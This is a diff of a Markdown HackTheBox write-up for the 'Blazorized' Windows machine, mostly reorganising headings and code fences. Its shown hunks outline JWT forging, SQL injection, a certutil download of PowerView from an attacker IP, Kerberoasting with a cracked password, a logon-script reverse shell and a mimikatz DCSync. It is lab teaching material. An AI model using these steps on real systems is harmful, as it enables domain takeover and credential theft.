@@ -8,9 +8,11 @@ categories: ['HackTheBox', 'Active-Directory', 'Windows']
 
 ![](/assets/images/headers/Blazorized.png)
 
+# Synopsis
+
 Blazorized is a Windows machine, starting with a website written using the Blazor .NET framework that allows downloading a DLL file that can be reverse engineered to find a JWT secret and use it to get access to the admin panel. The admin panel is vulnerable to an SQL injection to get code execution. To pivot to the next user, the WriteSPN privilege  can be abused to perform a targeted Kerberoast attack on another user. The targeted user is able to write a logon script that ultimately gives access to a user that allows performing a DCSync attack on the domain.
 
-# Reconnaissance
+## Reconnaissance
 Starting with an nmap scan, we see that the host is a domain controller and redirects us to `blazorized.htb`. 
 
 ```console
@@ -60,7 +62,7 @@ This function makes a request to `api.blazorized.htb` so we add this to our host
 
 ![Check for updates API call](/assets/images/writeups/blazorized/check-updates-api.png)
 
-## JWT Token Forging
+### JWT Token Forging
 We can decode the JWT token with [jwt.io](https://jwt.io/):
 
 ```json
@@ -106,14 +108,14 @@ $ curl http://blazorized.htb/_framework/blazor.boot.json
 }
 ```
 
-## DLL Reversing
+### DLL Reversing
 After looking at the files one by one and decompiling them using `dnSpy` we find something interesting for the `Blazorized.Helpers.dll` in the function `JWT`.
 
 ![](/assets/images/writeups/blazorized/blazor-dll-decompile.png)
 
 Within the decompiled dll there is a `jwtSymmetricSecurityKey` along with several other variables, one of which is an endpoint to the administrator dashboard. We can add this to our hosts file as well.
 
-# User
+## User
 With the found JWT secret and admin subdomain, we can generate a new JWT token with the following payload and using the signature we found (make sure to increase the expiration to make the token valid for a longer period).
 
 ```
@@ -136,7 +138,7 @@ Now you can copy the JWT token and import the token into the browser by creating
 
 ![](/assets/images/writeups/blazorized/admin-panel.png)
 
-## SQL Injection
+### SQL Injection
 The Super Admin Panel allows managing posts. One feature is looking for duplicate post titles that is vulnerable to blind SQL injection. This can be verified by the following payload:
 
 ```
@@ -173,7 +175,7 @@ C:\Windows\system32>whoami
 blazorized\nu_1055
 ```
 
-# Root
+## Root
 On the machine we see two additional users (`RSA_4810` and `SSA_6010`).
 
 ```console
@@ -190,7 +192,7 @@ C:\Users>dir
 06/19/2024  07:39 AM    <DIR>          SSA_6010
 ```
 
-## BloodHound Enumeration
+### BloodHound Enumeration
 Since this is a domain controller and we are a domain user, we can run SharpHound to get more information about the users in the domain and what permissions they have.
 
 ```console
@@ -209,7 +211,9 @@ It might be necessary to extract the json files from the ZIP file and converting
 
 ![](/assets/images/writeups/blazorized/bloodhound-NU.png)
 
+### WriteSPN Abuse
 We can copy PowerView onto the host and perform the attack from Windows.
+
 ```console
 PS C:\Users\NU_1055> certutil -f -urlcache http://10.10.14.4:8888/PowerView.ps1 PowerView.ps1
 PS C:\Users\NU_1055> . .\PowerView.ps1
@@ -229,13 +233,15 @@ $ hashcat -m 13100 RSA_4810.hash $ROCKYOU
 
 The password of the user is `(Ni7856Do9854Ki05Ng0005 #)`. 
 
-## DACL Abuse
+### DACL Abuse
 
-We can now login with Evil-WinRM and we look for ACLs that can be abused.
+We can now login with Evil-WinRM.
 
 ```console
 $ evil-winrm -i 10.10.11.22 -u 'RSA_4810' -p '(Ni7856Do9854Ki05Ng0005 #)'
-
+```
+We look for ACLs that can be abused using PowerView.
+```powershell
 *Evil-WinRM* PS C:\Users\RSA_4810\Documents> upload PowerView.ps1
 *Evil-WinRM* PS C:\Users\RSA_4810\Documents> . .\PowerView.ps1
 *Evil-WinRM* PS C:\Users\RSA_4810\Documents> Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ObjectAceType, ActiveDirectoryRights | fl
@@ -251,7 +257,7 @@ ActiveDirectoryRights : WriteProperty
 ```
 
 We find one ACL for our current user that shows a WriteProperty on the script path of the `SSA_6010` user. By having this permission it could allow us to write a custom logon script that executes whenever this user tries to login to the machine. We can look if this user tried to login:
-```console
+```powershell
 *Evil-WinRM* PS C:\Users\RSA_4810\Documents> [DateTime]::FromFileTime((Get-ADUser -Identity ssa_6010 -Properties LastLogon).LastLogon)
 Saturday, November 9, 2024 4:32:38 AM
 *Evil-WinRM* PS C:\Users\RSA_4810\Documents> date
@@ -260,7 +266,7 @@ Saturday, November 9, 2024 4:32:44 AM
 
 It looks like this person is logging in and out every minute so lets abuse this now. We are able to write a `bat` file in `sysvol\[domain]\scripts\` and use this to run a reverse shell whenever the user `SSA_6010` tries to login. We can check which logon script folder is from our target user by checking the permissions.
 
-```console
+```powershell
 *Evil-WinRM* PS C:\windows\sysvol\domain\scripts> icacls A32FF3AEAA23
 A32FF3AEAA23 BLAZORIZED\RSA_4810:(OI)(CI)(F)
              BLAZORIZED\Administrator:(OI)(CI)(F)
@@ -278,6 +284,8 @@ A32FF3AEAA23 BLAZORIZED\RSA_4810:(OI)(CI)(F)
 We wait a minute for the user to login and catch our reverse shell. From BloodHound we also see that this user is able to perform a DCSync attack.
 
 ![](/assets/images/writeups/blazorized/bloodhound-SSA.png)
+
+### DCSync
 
 We upload `mimikatz.exe` and perform the attack and get the hash of the Domain Admin.
 
